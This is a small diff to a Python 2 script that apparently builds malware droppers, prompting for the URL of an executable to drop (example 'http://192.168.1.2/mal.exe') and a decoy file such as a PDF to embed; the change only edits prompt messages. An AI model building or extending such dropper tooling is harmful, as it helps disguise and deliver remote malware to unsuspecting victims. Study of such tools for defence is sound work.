@@ -81,7 +81,8 @@ def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))
 
 def begin():
-    print '\n[!] Attemption put direct url! ex: http://192.168.1.2/mal.exe\n'
+    print '\n[!] Attemption put direct url! ex: http://192.168.1.2/mal.exe'
+    print '[\n[*] Remember to include the http or https.\n'
     url_d = raw_input('Insert url from your exe to drop: ')
     embed_d = raw_input('Insert url from file to embed: ')
     if 'pdf' in embed_d:
